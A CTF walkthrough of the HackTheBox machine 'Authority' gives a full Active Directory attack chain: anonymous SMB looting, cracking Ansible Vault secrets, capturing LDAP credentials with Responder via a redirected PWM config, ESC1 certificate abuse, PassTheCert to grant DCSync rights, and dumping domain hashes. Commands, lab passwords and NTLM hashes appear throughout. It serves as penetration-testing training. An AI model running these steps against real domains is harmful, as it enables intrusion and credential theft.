---
title: "Authority — HackTheBox Writeup (Windows Medium)"
published: 2026-08-26
description: "Writeup for the Authority machine on HackTheBox — Windows Medium. Chain: SMB anonymous access → Ansible Vault cracking → PWM credential theft via LDAP redirect → ESC1 ADCS abuse → PassTheCert → DCSync."
image: "/assets/images/writeups/authority/cover.png"
tags: [HackTheBox, Active Directory, Windows, Medium, ADCS, ESC1, "Ansible Vault", PassTheCert, DCSync]
category: Writeups
draft: false
---

## Overview

**Authority** is a Medium Windows machine from HackTheBox that simulates a realistic Active Directory environment with multiple misconfigurations. The attack chain begins with anonymous SMB access to a Development share containing Ansible automation files with encrypted vault secrets. After cracking the vault password, we recover credentials for a PWM (Password Self Service) application. By redirecting the LDAP configuration to our attacker machine, we capture cleartext domain credentials. For privilege escalation, we exploit a vulnerable ADCS certificate template (ESC1) via a newly created machine account, then use PassTheCert to grant DCSync privileges and fully compromise the domain.

**Topics covered:**

- SMB anonymous enumeration and sensitive file discovery
- Ansible Vault cracking with John the Ripper
- PWM (Password Self Service) configuration abuse
- LDAP credential interception via Responder
- BloodHound Active Directory enumeration
- **ADCS ESC1** — Enrollee Supplies Subject with Client Authentication on a template enrollable by Domain Computers
- Machine account creation (MachineAccountQuota abuse)
- **PassTheCert** — Schannel authentication to LDAP when PKINIT is unsupported (KDC_ERR_PADATA_TYPE_NOSUPP)
- **DCSync** attack to dump all domain credentials

![Authority Cover](/assets/images/writeups/authority/cover.png)

---

## Initial Access

### Nmap

```bash
$ nmap -sV -sC -Pn 10.129.229.56 --reason -oN nmap.txt
Starting Nmap 7.99 ( https://nmap.org ) at 2026-08-25 16:06 +0100
Nmap scan report for authority.htb (10.129.229.56)
Host is up, received user-set (0.19s latency).
Not shown: 986 closed tcp ports (reset)
PORT     STATE SERVICE       REASON          VERSION
53/tcp   open  domain        syn-ack ttl 127 Simple DNS Plus
80/tcp   open  http          syn-ack ttl 127 Microsoft IIS httpd 10.0
88/tcp   open  kerberos-sec  syn-ack ttl 127 Microsoft Windows Kerberos
135/tcp  open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
139/tcp  open  netbios-ssn   syn-ack ttl 127 Microsoft Windows netbios-ssn
389/tcp  open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: authority.htb)
445/tcp  open  microsoft-ds? syn-ack ttl 127
464/tcp  open  kpasswd5?     syn-ack ttl 127
593/tcp  open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
636/tcp  open  ssl/ldap      syn-ack ttl 127 Microsoft Windows Active Directory LDAP
3268/tcp open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP
3269/tcp open  ssl/ldap      syn-ack ttl 127 Microsoft Windows Active Directory LDAP
5985/tcp open  http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
8443/tcp open  ssl/http      syn-ack ttl 127 Apache Tomcat (language: en)
Service Info: Host: AUTHORITY; OS: Windows; CPE: cpe:/o:microsoft:windows
```

Two web servers are running: one on port `80` (default IIS page) and another on `8443` hosting a **Password Self Service** application.

![Password Self Service on port 8443](/assets/images/writeups/authority/image.png)

I need credentials to log in.

### Hostname

```bash
┌──(tazarni㉿tazarni)-[~/CTF/HTB/vip_plus/authority]
└─$ nxc smb 10.129.229.56 --generate-hosts-file hosts
SMB         10.129.229.56   445    AUTHORITY        [*] Windows 10 / Server 2019 Build 17763 x64 (name:AUTHORITY) (domain:authority.htb) (signing:True) (SMBv1:None) (Null Auth:True)

┌──(tazarni㉿tazarni)-[~/CTF/HTB/vip_plus/authority]
└─$ cat hosts | sudo tee -a /etc/hosts
10.129.229.56     AUTHORITY.authority.htb authority.htb AUTHORITY
```

### SMB Anonymous Access

Anonymous access on SMB is enabled, allowing us to list the shares:

```bash
$ nxc smb 10.129.229.56 -u 'Guest' -p '' --shares
SMB         10.129.229.56   445    AUTHORITY        Share           Permissions     Remark
SMB         10.129.229.56   445    AUTHORITY        -----           -----------     ------
SMB         10.129.229.56   445    AUTHORITY        ADMIN$                          Remote Admin
SMB         10.129.229.56   445    AUTHORITY        C$                              Default share
SMB         10.129.229.56   445    AUTHORITY        Department Shares
SMB         10.129.229.56   445    AUTHORITY        Development     READ
SMB         10.129.229.56   445    AUTHORITY        IPC$            READ            Remote IPC
SMB         10.129.229.56   445    AUTHORITY        NETLOGON                        Logon server share
SMB         10.129.229.56   445    AUTHORITY        SYSVOL                          Logon server share
```

There are 2 non-default shares: `Department Shares` and `Development`. We have `READ` access on the `Development` share:

```bash
$ smbclient //10.129.229.56/Development -U ''
smb: \> ls
  .                                   D        0  Fri Mar 17 14:20:38 2023
  ..                                  D        0  Fri Mar 17 14:20:38 2023
  Automation                          D        0  Fri Mar 17 14:20:40 2023

smb: \> recurse ON
smb: \> prompt OFF
smb: \> mget *
```

What I found in the share:

```
# ADCS -> default -> main.yml
ca_passphrase: SuP3rS3creT
ca_email_address: admin@authority.htb

# ansible_inventory
ansible_user: administrator
ansible_password: Welcome1

# ansible.cfg
remote_user = svc_pwm

# tomcat-users.xml.j2
<user username="admin" password="T0mc@tAdm1n" roles="manager-gui"/>
<user username="robot" password="T0mc@tR00t" roles="manager-script"/>
```

Also some Ansible Vault-encrypted secrets in `pwm/main.yml`:

![Ansible Vault encrypted values](/assets/images/writeups/authority/image-1.png)

:::note
[**Ansible Vault**](https://docs.ansible.com/projects/ansible/latest/vault_guide/index.html) is a built-in feature in Ansible that encrypts sensitive data like passwords, API keys, and credentials so you can safely store them in version control systems like Git.
:::

### Cracking the Ansible Vaults

I saved each vault block to a file and converted them to hashes:

```bash
$ ansible2john pwm_admin_login.vault >> pwm_admin_login.hash
$ ansible2john pwm_admin_password.vault >> pwm_admin_password.hash
$ ansible2john ldap_admin_password.vault >> ldap_admin_password.hash

$ john --wordlist=/usr/share/wordlists/rockyou.txt pwm_admin_password.hash
!@#$%^&*         (pwm_admin_password.vault)

$ john --wordlist=/usr/share/wordlists/rockyou.txt ldap_admin_password.hash
!@#$%^&*         (ldap_admin_password.vault)
```

Successfully recovered the vault password. Now decrypting the vaults:

```bash
$ cat pwm_admin_login.vault | ansible-vault decrypt
Vault password:
Decryption successful
svc_pwm

$ cat pwm_admin_password.vault | ansible-vault decrypt
Vault password:
Decryption successful
pWm_@dm!N_!23

$ cat ldap_admin_password.vault | ansible-vault decrypt
Vault password:
Decryption successful
DevT3st@123
```

The second credential (`pWm_@dm!N_!23`) successfully logged me in to the Password Self Service application:

![Logged into PWM](/assets/images/writeups/authority/image-2.png)

I downloaded the PWM config file and found a hash there, but it is not crackable.

### LDAP Credential Capture

In the PWM editor, I found the LDAP configuration:

![LDAP configuration in PWM](/assets/images/writeups/authority/image-3.png)

I changed the LDAP URL to point to my server and started Responder to capture connections:

![Modified LDAP URL](/assets/images/writeups/authority/image-4.png)

```bash
sudo responder -I tun0 -v
```

Clicking `Test LDAP Profile` triggers the connection:

![Test LDAP Profile button](/assets/images/writeups/authority/image-5.png)

Successfully captured the cleartext password for `svc_ldap`:

![Captured credentials in Responder](/assets/images/writeups/authority/image-6.png)

The user has WinRM access:

![WinRM access as svc_ldap](/assets/images/writeups/authority/image-7.png)

**User flag captured!**

---

## Privilege Escalation

With domain credentials, I can enumerate the domain using BloodHound.

### BloodHound Enumeration

```bash
$ rusthound-ce \
  -d authority.htb \
  -u svc_ldap \
  -p 'lDaP_1n_th3_cle4r!' \
  -i 10.129.229.56 \
  -c All \
  -z \
  --ldaps
```

![BloodHound graph](/assets/images/writeups/authority/image-8.png)

I did not find direct Outbound Object Controls for the current user, except some ADCS certificate enrollment rights.

### ADCS — ESC1

Since ADCS is in use, I enumerated vulnerable templates using `certipy`:

```bash
$ certipy find -u svc_ldap -p 'lDaP_1n_th3_cle4r!' -target authority.htb -text -stdout -vulnerable
```

Key findings for the `CorpVPN` template:

```
Template Name                       : CorpVPN
Client Authentication               : True
Enrollee Supplies Subject           : True
Enrollment Rights                   : AUTHORITY.HTB\Domain Computers
[!] Vulnerabilities
    ESC1 : Enrollee supplies subject and template allows client authentication.
```

The template is vulnerable to **ESC1**, but only **Domain Computers** can enroll. I checked the Machine Account Quota:

![MachineAccountQuota = 10](/assets/images/writeups/authority/image-9.png)

Confirmed — any authenticated user can create up to 10 computer accounts.

### Adding a Computer Account

```bash
$ impacket-addcomputer 'authority.htb/svc_ldap:lDaP_1n_th3_cle4r!' \
    -computer-name 'ninho' -computer-pass 'Ninho1234!' -dc-ip 10.129.229.56
[*] Successfully added machine account ninho$ with password Ninho1234!.
```

### Requesting a Certificate as Administrator

```bash
$ certipy req -ca 'AUTHORITY-CA' -u 'ninho$' -p 'Ninho1234!' \
    -target authority.htb -template 'CorpVPN' \
    -upn 'administrator@authority.htb' \
    -sid 'S-1-5-21-622327497-3269355298-2248959698-500'
[*] Successfully requested certificate
[*] Got certificate with UPN 'administrator@authority.htb'
[*] Wrote certificate and private key to 'administrator.pfx'
```

Attempting to get the NTLM hash via PKINIT:

```bash
$ certipy auth -pfx administrator.pfx -dc-ip 10.129.229.56
[-] Got error while trying to request TGT: Kerberos SessionError: KDC_ERR_PADATA_TYPE_NOSUPP(KDC has no support for padata type)
```

The DC does not support PKINIT. The solution is **PassTheCert** — using Schannel authentication over LDAPS instead.

### PassTheCert

Extracting the certificate and key:

```bash
$ certipy cert -pfx administrator.pfx -nokey -out administrator.crt
$ certipy cert -pfx administrator.pfx -nocert -out administrator.key
```

Granting `svc_ldap` DCSync privileges via Schannel authentication:

```bash
$ passthecert.py -action modify_user -crt administrator.crt -key administrator.key \
    -domain authority.htb -dc-ip 10.129.229.56 -target svc_ldap -elevate
[*] Granted user 'svc_ldap' DCSYNC rights!
```

This works by connecting to LDAPS using the administrator certificate through Schannel and grants the target user DCSync rights.

### DCSync

```bash
$ impacket-secretsdump 'authority.htb/svc_ldap:lDaP_1n_th3_cle4r!@10.129.229.56' -dc-ip 10.129.229.56
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:6961f422924da90a6928197429eea4ed:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:bd6bd7fcab60ba569e3ed57c7c322908:::
svc_ldap:1601:aad3b435b51404eeaad3b435b51404ee:6839f4ed6c7e142fed7988a6c5d0c5f1:::
AUTHORITY$:1000:aad3b435b51404eeaad3b435b51404ee:736d9b49ba922e578db03ac49160a1ae:::
```

The domain is now fully compromised:

![Root flag captured](/assets/images/writeups/authority/image-10.png)

**Root flag captured!**
